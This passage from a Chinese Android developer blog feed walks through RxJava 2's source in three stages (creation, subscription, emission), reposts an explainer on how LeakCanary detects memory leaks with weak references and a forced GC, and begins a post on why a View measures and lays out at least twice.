接下来我们一起来阅读下其中的源码，我们分为三个阶段，来看下RxJava真正的流程是怎样的 创建阶段首先我们来看下响应类型对象的创建流程就例子而言，我们经过一系列链式调用后（除去subscribe方法）得到的是一个Observable对象 首先我们先来看下Observable#create方法Observable#create: 1234public static &lt;T&gt; Observable&lt;T&gt; create(ObservableOnSubscribe&lt;T&gt; source) &#123; ObjectHelper.requireNonNull(source, \"source is null\"); return RxJavaPlugins.onAssembly(new ObservableCreate&lt;T&gt;(source));&#125; 其中，第2行的ObjectHelper#requireNonNull用于检测传入的数据是否为null，因为在RxJava的数据流中是不允许出现null的，后续类似的代码我们将忽略第3行的RxJavaPlugins是一个全局的工具类，它允许我们设置一些监听器，在相应的hook点执行我们自己的操作，这里我们默认什么也不做，只返回原本的对象，后续类似的代码我们也将忽略综上，Observable#create方法返回了一个ObservableCreate对象，并把我们写的ObservableOnSubscribe匿名内部类当做构造参数传入持有 接下来我们来看看Observable#map方法Observable#map: 1234public final &lt;R&gt; Observable&lt;R&gt; map(Function&lt;? super T, ? extends R&gt; mapper) &#123; ObjectHelper.requireNonNull(mapper, \"mapper is null\"); return RxJavaPlugins.onAssembly(new ObservableMap&lt;T, R&gt;(this, mapper));&#125; map方法也很简单，返回了一个ObservableMap对象，并把Observable#create返回的ObservableCreate对象，以及我们写的Function匿名内部类当做构造参数传入持有值得注意的是，这里返回的Observable的泛型参数已经改变了 接下来我们来看看Observable#observeOn方法Observable#observeOn: 12345678public final Observable&lt;T&gt; observeOn(Scheduler scheduler) &#123; return observeOn(scheduler, false, bufferSize());&#125;public final Observable&lt;T&gt; observeOn(Scheduler scheduler, boolean delayError, int bufferSize) &#123; ObjectHelper.requireNonNull(scheduler, \"scheduler is null\"); ObjectHelper.verifyPositive(bufferSize, \"bufferSize\"); return RxJavaPlugins.onAssembly(new ObservableObserveOn&lt;T&gt;(this, scheduler, delayError, bufferSize));&#125; 该方法返回了一个ObservableObserveOn对象，持有了map返回的ObservableMap对象，以及我们传入的调度器Schedulers.newThread() 接下来我们来看看Observable#doOnNext方法Observable#doOnNext: 12345678910public final Observable&lt;T&gt; doOnNext(Consumer&lt;? super T&gt; onNext) &#123; return doOnEach(onNext, Functions.emptyConsumer(), Functions.EMPTY_ACTION, Functions.EMPTY_ACTION);&#125;private Observable&lt;T&gt; doOnEach(Consumer&lt;? super T&gt; onNext, Consumer&lt;? super Throwable&gt; onError, Action onComplete, Action onAfterTerminate) &#123; ObjectHelper.requireNonNull(onNext, \"onNext is null\"); ObjectHelper.requireNonNull(onError, \"onError is null\"); ObjectHelper.requireNonNull(onComplete, \"onComplete is null\"); ObjectHelper.requireNonNull(onAfterTerminate, \"onAfterTerminate is null\"); return RxJavaPlugins.onAssembly(new ObservableDoOnEach&lt;T&gt;(this, onNext, onError, onComplete, onAfterTerminate));&#125; 该方法返回了一个ObservableDoOnEach对象，持有了observeOn返回的ObservableObserveOn对象，我们传入的Consumer对象以及一些我们并不关心的其他东西 接下来我们来看看Observable#filter方法Observable#filter: 1234public final Observable&lt;T&gt; filter(Predicate&lt;? super T&gt; predicate) &#123; ObjectHelper.requireNonNull(predicate, \"predicate is null\"); return RxJavaPlugins.onAssembly(new ObservableFilter&lt;T&gt;(this, predicate));&#125; 该方法返回了一个ObservableFilter对象，持有了doOnNext返回的ObservableDoOnEach对象，以及我们传入的Predicate对象 接下来我们来看看Observable#subscribeOn方法Observable#subscribeOn: 1234public final Observable&lt;T&gt; subscribeOn(Scheduler scheduler) &#123; ObjectHelper.requireNonNull(scheduler, \"scheduler is null\"); return RxJavaPlugins.onAssembly(new ObservableSubscribeOn&lt;T&gt;(this, scheduler));&#125; 该方法返回了一个ObservableSubscribeOn对象，持有了filter返回的ObservableFilter对象，以及我们传入的调度器Schedulers.io() 接下来又调用了Observable#observeOn方法，返回了一个ObservableObserveOn对象，持有了subscribeOn返回的ObservableSubscribeOn对象，以及我们传入的调度器AndroidSchedulers.mainThread() 可见，在创建阶段，我们获得了一个“层层包裹”的ObservableObserveOn对象就像是在使用java.io中的stream一样，通过装饰器模式“层层包裹”来增强相应的功能： 1new BufferedReader(new InputStreamReader(new ByteArrayInputStream())) 创建阶段具体流程可用下图表示： 订阅阶段接下来，我们对创建阶段得到的ObservableObserveOn对象调用了subscribe方法，这是在父类Observable中的一个final方法，我们一起来看下Observable#subscribe: 12345678910111213141516171819202122232425262728293031323334353637public final Disposable subscribe(Consumer&lt;? super T&gt; onNext) &#123; return subscribe(onNext, Functions.ON_ERROR_MISSING, Functions.EMPTY_ACTION, Functions.emptyConsumer());&#125;public final Disposable subscribe(Consumer&lt;? super T&gt; onNext, Consumer&lt;? super Throwable&gt; onError, Action onComplete, Consumer&lt;? super Disposable&gt; onSubscribe) &#123; ObjectHelper.requireNonNull(onNext, \"onNext is null\"); ObjectHelper.requireNonNull(onError, \"onError is null\"); ObjectHelper.requireNonNull(onComplete, \"onComplete is null\"); ObjectHelper.requireNonNull(onSubscribe, \"onSubscribe is null\"); LambdaObserver&lt;T&gt; ls = new LambdaObserver&lt;T&gt;(onNext, onError, onComplete, onSubscribe); subscribe(ls); return ls;&#125;public final void subscribe(Observer&lt;? super T&gt; observer) &#123; ObjectHelper.requireNonNull(observer, \"observer is null\"); try &#123; observer = RxJavaPlugins.onSubscribe(this, observer); ObjectHelper.requireNonNull(observer, \"Plugin returned null Observer\"); subscribeActual(observer); &#125; catch (NullPointerException e) &#123; // NOPMD throw e; &#125; catch (Throwable e) &#123; Exceptions.throwIfFatal(e); // can't call onError because no way to know if a Disposable has been set or not // can't call onSubscribe because the call might have set a Subscription already RxJavaPlugins.onError(e); NullPointerException npe = new NullPointerException(\"Actually not, but can't throw other exceptions due to RS\"); npe.initCause(e); throw npe; &#125;&#125; 在代码第11行，我们可以看到我们传入的监听器onNext被包装成为了一个LambdaObserver对象接着在第24行，以该对象作为参数调用了ObservableObserveOn#subscribeActualObservableObserveOn#subscribeActual: 12345678910@Overrideprotected void subscribeActual(Observer&lt;? super T&gt; observer) &#123; if (scheduler instanceof TrampolineScheduler) &#123; source.subscribe(observer); &#125; else &#123; Scheduler.Worker w = scheduler.createWorker(); source.subscribe(new ObserveOnObserver&lt;T&gt;(observer, w, delayError, bufferSize)); &#125;&#125; 在subscribeActual方法中，我们传入的scheduler是AndroidSchedulers.mainThread()，它是一个HandlerScheduler，因此走的是分支语句的else逻辑在这里，我们的LambdaObserver对象被包装成为一个ObserveOnObserver对象，并与scheduler创建的Worker绑定在了一起接着调用了source的subscribe方法，这里的source即是我们构造ObservableObserveOn时传入的“上游”数据源————ObservableSubscribeOn对象 由于Observable#subscribe是一个final方法，无法被子类重写，并且它最终的逻辑都会调用子类的subscribeActual方法，这里我们直接看ObservableSubscribeOn#subscribeActualObservableSubscribeOn#subscribeActual: 1234567891011121314151617181920@Overridepublic void subscribeActual(final Observer&lt;? super T&gt; s) &#123; final SubscribeOnObserver&lt;T&gt; parent = new SubscribeOnObserver&lt;T&gt;(s); s.onSubscribe(parent); parent.setDisposable(scheduler.scheduleDirect(new SubscribeTask(parent)));&#125;final class SubscribeTask implements Runnable &#123; private final SubscribeOnObserver&lt;T&gt; parent; SubscribeTask(SubscribeOnObserver&lt;T&gt; parent) &#123; this.parent = parent; &#125; @Override public void run() &#123; source.subscribe(parent); &#125;&#125; 首先在第3行，我们的ObserveOnObserver对象被包装成为了SubscribeOnObserver对象接着在第5行，调用了ObserveOnObserver#onSubscribeObserveOnObserver#onSubscribe: 12345678910111213141516171819202122232425262728293031@Overridepublic void onSubscribe(Disposable s) &#123; if (DisposableHelper.validate(this.s, s)) &#123; this.s = s; if (s instanceof QueueDisposable) &#123; @SuppressWarnings(\"unchecked\") QueueDisposable&lt;T&gt; qd = (QueueDisposable&lt;T&gt;) s; int m = qd.requestFusion(QueueDisposable.ANY | QueueDisposable.BOUNDARY); if (m == QueueDisposable.SYNC) &#123; sourceMode = m; queue = qd; done = true; actual.onSubscribe(this); schedule(); return; &#125; if (m == QueueDisposable.ASYNC) &#123; sourceMode = m; queue = qd; actual.onSubscribe(this); return; &#125; &#125; queue = new SpscLinkedArrayQueue&lt;T&gt;(bufferSize); actual.onSubscribe(this); &#125;&#125; 经过一系列检查后，最终会调用actual对象的onSubscribe方法，而actual对象即是我们构造ObserveOnObserver对象时传入的LambdaObserver对象LambdaObserver#onSubscribe: 123456789101112@Overridepublic void onSubscribe(Disposable s) &#123; if (DisposableHelper.setOnce(this, s)) &#123; try &#123; onSubscribe.accept(this); &#125; catch (Throwable ex) &#123; Exceptions.throwIfFatal(ex); s.dispose(); onError(ex); &#125; &#125;&#125; 因为我们再例子中没有传入相应的监听器，所以这里onSubscribe是由Functions.emptyConsumer()创建的，什么也不会做如果我们传入了相应的监听器，则会在当前线程收到开始订阅的回调通知（onSubscribe） 回到subscribeActual这里，接着第7行调用了传入的scheduler的scheduleDirect方法，执行了特定的任务SubscribeTask这里我们不去深究具体的代码，由于我们传入的是Schedulers.io()，因此容易得知SubscribeTask#run是在io线程中执行的在第18行，此时我们已经处于io线程中，同上，我们以SubscribeOnObserver对象作为参数，调用了“上游”数据源source————ObservableFilter的subscribe方法ObservableFilter#subscribeActual: 1234@Overridepublic void subscribeActual(Observer&lt;? super T&gt; s) &#123; source.subscribe(new FilterObserver&lt;T&gt;(s, predicate));&#125; 逻辑比较简单，把传入的SubscribeOnObserver对象与构造时传入的Predicate对象绑定在一起，包装成FilterObserver对象后，调用了“上游”数据源source————ObservableDoOnEach的subscribe方法ObservableDoOnEach#subscribeActual: 1234@Overridepublic void subscribeActual(Observer&lt;? super T&gt; t) &#123; source.subscribe(new DoOnEachObserver&lt;T&gt;(t, onNext, onError, onComplete, onAfterTerminate));&#125; 逻辑类似，把传入的FilterObserver对象与构造时传入的Consumer对象绑定在一起，包装成DoOnEachObserver对象后，调用了“上游”数据源source————ObservableObserveOn的subscribe方法 与上面提到的一样，ObservableObserveOn#subscribeActual会把DoOnEachObserver对象与scheduler（Schedulers.newThread()）创建的Worker绑定在了一起，包装成ObserveOnObserver对象，交给“上游”数据源————ObservableMapObservableMap#subscribeActual: 1234@Overridepublic void subscribeActual(Observer&lt;? super U&gt; t) &#123; source.subscribe(new MapObserver&lt;T, U&gt;(t, function));&#125; 逻辑类似，把传入的ObserveOnObserver对象与构造时传入的Function对象绑定在一起，包装成MapObserver对象后，交给了“上游”数据源source————ObservableCreateObservableCreate#subscribeActual: 123456789101112@Overrideprotected void subscribeActual(Observer&lt;? super T&gt; observer) &#123; CreateEmitter&lt;T&gt; parent = new CreateEmitter&lt;T&gt;(observer); observer.onSubscribe(parent); try &#123; source.subscribe(parent); &#125; catch (Throwable ex) &#123; Exceptions.throwIfFatal(ex); parent.onError(ex); &#125;&#125; 在第3行，传入的MapObserver对象被包装成了CreateEmitter然后在第4行调用了MapObserver#onSubscribe，不过由于我们前面已经回调了订阅事件，因此这里实际上并不会回调到我们的监听器中，有兴趣的童鞋可以进一步看下相关源码在第7行，调用了“上游”数据源source————我们构造的ObservableOnSubscribe匿名内部类的subscribe方法 至此，订阅阶段结束，这次被“层层包裹”的是我们的监听器Observer订阅阶段的流程图如下所示： 发射数据阶段在订阅阶段的最后，我们调用了ObservableOnSubscribe匿名内部类的subscribe方法，进入了发射数据的阶段首先，让我们一起来回顾下例子中的代码做了什么： 123456789Observable.create(new ObservableOnSubscribe&lt;Student&gt;() &#123; @Override public void subscribe(ObservableEmitter&lt;Student&gt; emitter) &#123; List&lt;Student&gt; list = getStudentList(); for (Student student : list) &#123; emitter.onNext(student); &#125; &#125;&#125;) 在第4行，我们首先通过getStudentList方法获得了学生数据列表，然后在第6行调用了emitter对象的onNext方法把数据发送了出去根据上文分析，这里的emitter对象实际类型为CreateEmitter，让我们来看下相关的代码CreateEmitter#onNext 12345678910111213141516final Observer&lt;? super T&gt; observer;CreateEmitter(Observer&lt;? super T&gt; observer) &#123; this.observer = observer;&#125;@Overridepublic void onNext(T t) &#123; if (t == null) &#123; onError(new NullPointerException(\"onNext called with null. Null values are generally not allowed in 2.x operators and sources.\")); return; &#125; if (!isDisposed()) &#123; observer.onNext(t); &#125;&#125; 逻辑比较简单，首先检查了发送的数据是否为null（因为在RxJava数据流中不允许任何null出现）然后如果是还没Disposed的情况下，把数据传递给了observer对象从构造函数可以看出，observer对象实际类型为订阅阶段传入的MapObserver对象，我们接着看下相关代码MapObserver#onNext 123456789101112131415161718192021final Function&lt;? super T, ? extends U&gt; mapper;MapObserver(Observer&lt;? super U&gt; actual, Function&lt;? super T, ? extends U&gt; mapper) &#123; super(actual); this.mapper = mapper;&#125;@Overridepublic void onNext(T t) &#123; ... U v; try &#123; v = ObjectHelper.requireNonNull(mapper.apply(t), \"The mapper function returned a null value.\"); &#125; catch (Throwable ex) &#123; fail(ex); return; &#125; actual.onNext(v);&#125; 在第15行，调用了我们在订阅阶段时绑定的Function对象进行映射（map）转换在进行了非空检查后，调用了actual对象，即ObserveOnObserver对象的onNext方法，继续数据的传递ObserveOnObserver#onNext 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869@Overridepublic void onNext(T t) &#123; ... if (sourceMode != QueueDisposable.ASYNC) &#123; queue.offer(t); &#125; schedule();&#125;void schedule() &#123; if (getAndIncrement() == 0) &#123; worker.schedule(this); &#125;&#125;@Overridepublic void run() &#123; if (outputFused) &#123; drainFused(); &#125; else &#123; drainNormal(); &#125;&#125;void drainNormal() &#123; int missed = 1; final SimpleQueue&lt;T&gt; q = queue; final Observer&lt;? super T&gt; a = actual; for (;;) &#123; if (checkTerminated(done, q.isEmpty(), a)) &#123; return; &#125; for (;;) &#123; boolean d = done; T v; try &#123; v = q.poll(); &#125; catch (Throwable ex) &#123; Exceptions.throwIfFatal(ex); s.dispose(); q.clear(); a.onError(ex); worker.dispose(); return; &#125; boolean empty = v == null; if (checkTerminated(d, empty, a)) &#123; return; &#125; if (empty) &#123; break; &#125; a.onNext(v); &#125; missed = addAndGet(-missed); if (missed == 0) &#123; break; &#125; &#125;&#125; 在第6行，ObserveOnObserver首先把数据加入了一个队列中，然后再第8行调用了schedule方法开启线程调度在第13行中，我们看到调用了worker对象的schedule方法，并传入了参数this这里我们不去深究Scheduler调度器的具体实现，根据上下文的含义，不难推断出，由于我们传入的调度器是Schedulers.newThread()，ObserveOnObserver实现的run方法将会在一个新的线程中被调用在run方法中，由于我们没有设置结果合并到一起输出，因此进入的是第22行的drainNormal逻辑最终在第61行，我们会把从队列中取出的数据，在新的线程中，继续传递给“下游”的监听器————DoOnEachObserver DoOnEachObserver#onNext 1234567891011121314151617181920212223242526272829DoOnEachObserver( Observer&lt;? super T&gt; actual, Consumer&lt;? super T&gt; onNext, Consumer&lt;? super Throwable&gt; onError, Action onComplete, Action onAfterTerminate) &#123; this.actual = actual; this.onNext = onNext; this.onError = onError; this.onComplete = onComplete; this.onAfterTerminate = onAfterTerminate;&#125;@Overridepublic void onNext(T t) &#123; if (done) &#123; return; &#125; try &#123; onNext.accept(t); &#125; catch (Throwable e) &#123; Exceptions.throwIfFatal(e); s.dispose(); onError(e); return; &#125; actual.onNext(t);&#125; 逻辑比较简单，交给了绑定的Consumer处理之后，继续把数据传递给“下游”的监听器————FilterObserverFilterObserver#onNext 123456789101112131415161718192021222324final Predicate&lt;? super T&gt; filter;FilterObserver(Observer&lt;? super T&gt; actual, Predicate&lt;? super T&gt; filter) &#123; super(actual); this.filter = filter;&#125;@Overridepublic void onNext(T t) &#123; if (sourceMode == NONE) &#123; boolean b; try &#123; b = filter.test(t); &#125; catch (Throwable e) &#123; fail(e); return; &#125; if (b) &#123; actual.onNext(t); &#125; &#125; else &#123; actual.onNext(null); &#125;&#125; 这里我们没有设置sourceMode，因此默认值为NONE，进入上半部分分支FilterObserver使用订阅阶段绑定的Predicate对象，通过其test方法的返回值判断哪些数据允许往下传递在例子中我们过滤条件为数据为偶数类型，因此test方法只有数据为偶数时才返回true，只有偶数数据才会被传递到“下游”————SubscribeOnObserver SubscribeOnObserver#onNext 1234@Overridepublic void onNext(T t) &#123; actual.onNext(t);&#125; 啥也没干，直接把数据往“下游”（ObserveOnObserver）传递ObserveOnObserver上面我们已经分析过了，这里就不再重复分析了，它会在把线程切换到Android主线程后（这里的调度器是AndroidSchedulers.mainThread()），把数据传递给“下游”————LambdaObserver LambdaObserver#onNext 12345678910111213141516171819202122public LambdaObserver(Consumer&lt;? super T&gt; onNext, Consumer&lt;? super Throwable&gt; onError, Action onComplete, Consumer&lt;? super Disposable&gt; onSubscribe) &#123; super(); this.onNext = onNext; this.onError = onError; this.onComplete = onComplete; this.onSubscribe = onSubscribe;&#125;@Overridepublic void onNext(T t) &#123; if (!isDisposed()) &#123; try &#123; onNext.accept(t); &#125; catch (Throwable e) &#123; Exceptions.throwIfFatal(e); get().dispose(); onError(e); &#125; &#125;&#125; 最终，LambdaObserver会把数据回调给我们一开始实现的Consumer匿名内部类至此，发射数据阶段结束，其流程图如下所示： 总结总而言之，RxJava的执行流程可以分为三个阶段： 创建阶段：使用装饰器模式“层层包裹”创建出一个 reactive type 对象（这里是Observable） 订阅阶段：使用装饰器模式“层层包裹”我们传入的监听器，不断调用“上游”的subscribe；回调开始订阅事件（onSubscribe），切换订阅线程 发射数据阶段：数据由顶层监听器向“下游”逐级传递，传递数据的同时执行相应的变换操作","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"LeakCanary，30分钟从入门到精通","slug":"LeakCanary，30分钟从入门到精通","date":"2018-12-18T12:12:29.000Z","updated":"2020-05-11T07:23:44.707Z","comments":true,"path":"2018/12/18/LeakCanary，30分钟从入门到精通/","link":"","permalink":"https://superxlcr.github.io/2018/12/18/LeakCanary，30分钟从入门到精通/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/1e7e9b576391 简述在性能优化中，内存是一个不得不聊的话题；然而内存泄漏，显示已经成为内存优化的一个重量级的方向。当前流行的内存泄漏分析工具中，不得不提的就是LeakCanary框架；这是一个集成方便， 使用便捷，配置超级简单的框架，实现的功能却是极为强大的。 用法简介你需要添加到配置的只有这个1234dependencies &#123; debugCompile 'com.squareup.leakcanary:leakcanary-android:1.3' releaseCompile 'com.squareup.leakcanary:leakcanary-android-no-op:1.3'&#125; 你肯定需要初始化一下，当然，推荐在Application中1234567public class MyApplicationextends Application &#123; @Override public void onCreate() &#123; super.onCreate(); LeakCanary.install(this); &#125;&#125; 什么？你还在下一步？已经结束了！通过以上配置，你就可以轻松使用LeakCanary检测内存泄漏了关于LeakCanary的详细使用教程，建议去看：LeakCanary 中文使用说明 闲聊结束，我想你们来肯定不是看我这些废话的，那么现在进入正题！本篇我们所想的，就是LeakCanary为什么可以这么神奇，它是怎么检测内存泄漏的？下面我们解开谜题！ 核心类分析 类 作用 LeakCanary SDK提供类 DisplayLeakActivity 内存泄漏的查看页面 HeapAnalyzerService 内存堆分析服务，为了保证App进程不会因此受影响变慢&amp;内存溢出，运行于独立的进程 HeapAnalyzer 分析由RefWatcher生成的堆转储信息， 验证内存泄漏是否真实存在 HeapDump 堆转储信息类，存储堆转储的相关信息 ServiceHeapDumpListener 一个监听，包含了开启分析的方法 RefWatcher 核心类， 翻译自官方： 检测不可达引用（可能地），当发现不可达引用时，它会触发HeapDumper(堆信息转储) ActivityRefWatcher Activity引用检测， 包含了Activity生命周期的监听执行与停止 通过以上列表，让大家对LeakCanary框架的主要类有个大体的了解，并基于以上列表，对这个框架的大体功能有一个模糊的猜测。 漫无目的的看源码，很容易迷失在茫茫的Code Sea中，无论是看源码，还是接手别人的项目，都是如此；因此，带着问题与目的性来看这些复杂的东西是很有必要的，也使得我们阅读效率大大提高；想要了解LeakCanary,我们最大的疑惑是什么，我列出来，看看是与你不约而同。 Question1:在Application中初始化之后，它是如何检测所有的Activity页面的？ Question2:内存泄漏的判定条件是什么 ？检测内存泄漏的机制原理是什么？ Question3:检测出内存泄漏后，它又是如何生成泄漏信息的？内存泄漏的输出轨迹是怎么得到的？ 回顾一下这个框架，其实我们想了解的机制不外乎三： 内存泄漏的检测机制 内存泄漏的判定机制 内存泄漏的轨迹生成机制 我们会在源码分析最后，依次回答以上的三个问题，可能在阅读源码之前，我们先要对内存泄漏做一些基础概念与原理的理解。 什么是内存泄漏（MemoryLeak）？大家对这个概念应该不陌生吧，当我们使用一个Bitmap,使用完成后，没有recycle回收；当我们使用Handler, 在Activity销毁时没有处理；当我们使用Cursor，最后没有close并置空;以上这些都会导致一定程度上的内存泄漏问题。那么，什么是内存泄漏？ 内存泄漏（Memory Leak）是指程序中己动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。 以上是百度百科的解释，总结下为：内存泄漏是不使用或用完的内存，因为某些原因无法回收，造成的一种内存浪费；内存泄漏的本质是内存浪费。以个人理解来解释，通俗一点就是 GC回收的对象必须是当前没有任何引用的对象 当对象在使用完成后（对我们而言已经是垃圾对象了）， 我们没有释放该对象的引用，导致GC不能回收该对象而继续占用内存 垃圾对象依旧占用内存，这块内存空间便浪费了 内存泄漏与内存溢出的区别是什么？从名称来看，一个泄漏，一个溢出，其实很好理解。 内存泄露：垃圾对象依旧占据内存，如水龙头的泄漏，水本来是属于水源的， 但是水龙头没关紧，那么泄漏到了水池；再来看内存，内存本来应该被回收，但是依旧在内存堆中；总结一下就是内存存在于不该存在的地方（没用的地方） 内存溢出：内存占用达到最大值，当需要分配内存时，已经没有内存可以分配了，就是溢出；依旧以水池为例， 水池的水如果满了，那么如果继续需要从水龙头流水的话，水就会溢出。总结一下就是，内存的分配超出最大阀值，导致了一种异常 明白了两者的概念，那么两者有什么关系呢？内存的溢出是内存分配达到了最大值，而内存泄漏是无用内存充斥了内存堆；因此内存泄漏是导致内存溢出的元凶之一，而且是很大的元凶；因为内存分配完后，哪怕占用再大，也会回收，而泄漏的内存则不然；当清理掉无用内存后，内存溢出的阀值也会相应降低。 JVM如何判定一个对象是垃圾对象？该问题也即垃圾对象搜索算法，JVM采用图论的可达遍历算法来判定一个对象是否是垃圾对象， 如果对象A是可达的，则认为该对象是被引用的，GC不会回收；如果对象A或者块B（多个对象引用组成的对象块）是不可达的，那么该对象或者块则判定是不可达的垃圾对象，GC会回收。 以上科普的两个小知识：1） 内存泄漏 2） JVM搜索算法 是阅读LeakCanary源码的基本功，有助于源码的理解与记忆。 好了，下面来看一下LeakCanary的源码，看看LeakCanary是怎么工作的吧！既然LeakCanary的初始化是从install()开始的，那么从init开始看 回顾一下核心类模块可知，内存分析模块是在独立进程中执行的，这么设计是为了保证内存分析过程不会对App进程造成消极的影响，如使App进程变慢或导致out of Memory问题等。因此 第一步： 判断APP进程与内存分析进程是否属于同一进程；如果是， 则返回空的RefWatcher DISABLED;如果不是，往下走，看第二步 是否与分析进程是同一个，isInAnalyzerProcess 与分析进程一致，返回一个空的DISABLED 第二步： enableDisplayLeakActivity 开启显示内存泄漏信息的页面 调用了setEnabled,记住参数DisplayLeakActivity就是查看泄漏的页面，enable传true,开启Activity组件 这个方法的作用是设置四大组件开启或禁用，从上图传的参数看，是开启了查看内存泄漏的页面 第三步：初始化一个ServiceHeapDumpListener，这是一个开启分析的接口实现类，类中定义了analyze方法，用于开启一个DisplayLeakService服务，从名字就可以看出，这是一个显示内存泄漏的辅助服务 看注释，这个服务的作用是分析HeapDump，写入一个记录文件，并弹出一个Notification 第四步：初始化两个Watcher, RefWatcher和ActivityRefWatcher. 这两个Watcher的作用分别为分析内存泄漏与监听Activity生命周期 ActivityRefWatcher监听Activity生命周期，在初始化时开始监听Activity生命周期（watchActivities） watchActivities中注册了所有Activity的生命周期统一监听；onActiityDestroy会在onDestroy时执行，执行watch，检测内存泄漏 通过以上代码分析，我们可以得出第一个问题的答案。LeakCanary通过ApplicationContext统一注册监听的方式，来监察所有的Activity生命周期，并在Activity的onDestroy时，执行RefWatcher的watch方法，该方法的作用就是检测本页面内是否存在内存泄漏问题。 下面我们继续来分析核心类RefWatcher中的源码，检测机制的核心逻辑便在RefWatcher中；相信阅读完这个类后，第二个问题的答案便呼之欲出了。 既然想弄明白RefWatcher做了什么，那么先来看一下官方的解释 监听可能不可达的引用，当RefWatcher判定一个引用可能不可达后，会触发HeapDumper（堆转储） 从上面图可以看出官方的解释。 RefWatcher是一个引用检测类，它会监听可能会出现泄漏（不可达）的对象引用，如果发现该引用可能是泄漏，那么会将它的信息收集起来（HeapDumper）.从RefWatcher源码来看，核心方法主要有两个： watch() 和 ensureGone()。如果我们想单独监听某块代码，如fragment或View等，我们需要手动去调用watch()来检测；因为上面讲过，默认的watch()仅执行于Activity的Destroy时。watch（）是我们直接调用的方法，ensureGone（）则是具体如何处理了，下面我们来看一下 watch 检测核心方法 上图为watch()的源码, 我们先来看一下官方的注释监听提供的引用，检查该引用是否可以被回收。这个方法是非阻塞的，因为检测功能是在Executor中的异步线程执行的 从上述源码可以看出，watch里面只是执行了一定的准备工作，如判空（checkNotNull）, 为每个引用生成一个唯一的key, 初始化KeyedWeakReference;关键代码还是在watchExecutor中异步执行。引用检测是在异步执行的，因此这个过程不会阻塞线程。 检测核心代码 gone()判定WeakReference中是否包含当前引用 以上是检测的核心代码实现，从源码可以看出，检测的流程： 移除不可达引用，如果当前引用不存在了，则不继续执行 手动触发GC操作，gcTrigger中封装了gc操作的代码 再次移除不可达引用，如果引用不存在了，则不继续执行 如果两次判定都没有被回收，则开始分析这个引用，最终生成HeapDump信息 总结一下原理： 弱引用与ReferenceQueue联合使用，如果弱引用关联的对象被回收，则会把这个弱引用加入到ReferenceQueue中；通过这个原理，可以看出removeWeaklyReachableReferences()执行后，会对应删除KeyedWeakReference的数据。如果这个引用继续存在，那么就说明没有被回收。 为了确保最大保险的判定是否被回收，一共执行了两次回收判定，包括一次手动GC后的回收判定。两次都没有被回收，很大程度上说明了这个对象的内存被泄漏了，但并不能100%保证；因此LeakCanary是存在极小程度的误差的。 上面的代码，总结下流程就是 判定是否回收（KeyedWeakReference是否存在该引用）， Y -&gt; 退出， N -&gt; 向下执行 手动触发GC 判定是否回收， Y -&gt; 退出， N-&gt; 向下执行 两次未被回收，则分析引用情况： humpHeap : 这个方法是生成一个文件，来保存内存分析信息 analyze: 执行分析 通过以上的代码分析，第二个问题的答案已经浮出水面了吧！ 接下来分析内存泄漏轨迹的生成~ 最终的调用，是在RefWatcher中的ensureGone()中的最后，如图 分析最终调用，在ensureGone()中很明显，走的是heapdumpListener中的analyze方法，继续追踪heapdumpListener是在LeakCanary初始化的时候初始化并传入RefWatcher的，如图 在install中初始化并传入RefWatcher打开进入ServiceHeapDumpListener,看里面实现，如图 ServiceHeapDumpListener中的analyze 调用了HeapAnalyzerService，在单独的进程中进行分析，如图 HeapAnalyzerService分析进程 HeapAnalyzerService中通过HeapAnalyzer来进行具体的分析，查看HeapAnalyzer源码，如图 HeapAnalyzer 进行分析时，调用了openSnapshot方法，里面用到了SnapshotFactory org.eclipse.mat 从上图可以看出，这个版本的LeakCanary采用了MAT对内存信息进行分析，并生成结果。其中在分析时，分为findLeakingReference与findLeakTrace来查找泄漏的引用与轨迹，根据GCRoot开始按树形结构依次建议当前引用的轨迹信息。 结论通过上述分析，最终得出的结果为： Activity检测机制是什么？答： 通过application.registerActivityLifecycleCallbacks来绑定Activity生命周期的监听，从而监控所有Activity; 在Activity执行onDestroy时，开始检测当前页面是否存在内存泄漏，并分析结果。因此，如果想要在不同的地方都需要检测是否存在内存泄漏，需要手动添加。 内存泄漏检测机制是什么？答： KeyedWeakReference与ReferenceQueue联合使用，在弱引用关联的对象被回收后，会将引用添加到ReferenceQueue；清空后，可以根据是否继续含有该引用来判定是否被回收；判定回收， 手动GC, 再次判定回收，采用双重判定来确保当前引用是否被回收的状态正确性；如果两次都未回收，则确定为泄漏对象。 内存泄漏轨迹的生成过程 ？答： 该版本采用eclipse.Mat来分析泄漏详细，从GCRoot开始逐步生成引用轨迹。 通过整篇文章分析，你还在疑惑么？ 补充最近微信开源了Matrix性能检测工具，里面也使用到了LeakCanary，不过同时还进行了一定的改进，主要有下面几点： GC不一定成功问题，改进为：通过一个一定能被回收的“哨兵”对象，用来确认系统确实进行了GC 对象加入弱引用ReferenceQueue有延迟问题，改进为：直接通过WeakReference#get()判断对象是否被成功回收 判断Activity是否可回收时其正好还被局部变量持有引起误判，改进为：多次判断，且重复创建才确认泄露 改进了相同Activity重复泄露多次提醒的问题 对生成的hprof文件进行了一定的裁剪 详情可参考文章：https://cloud.tencent.com/developer/article/1379397","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"View为什么会至少进行2次onMeasure、onLayout","slug":"View为什么会至少进行2次onMeasure、onLayout","date":"2018-12-11T12:03:29.000Z","updated":"2020-05-11T07:23:44.747Z","comments":true,"path":"2018/12/11/View为什么会至少进行2次onMeasure、onLayout/","link":"","permalink":"https://superxlcr.github.io/2018/12/11/View为什么会至少进行2次onMeasure、onLayout/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/733c7e9fb284 前言郭前辈的ListView源码解析一文，曾提到View至少会进行2次onMeasure、onLayout，但限于篇幅，并未解释原因，好奇就尝试找了找原因。 原因猜想 害怕.jpg 由于不知道具体原因，只能结合已有的知识，先做出如下猜想： View自身进行了2次onMeasure、onLayout 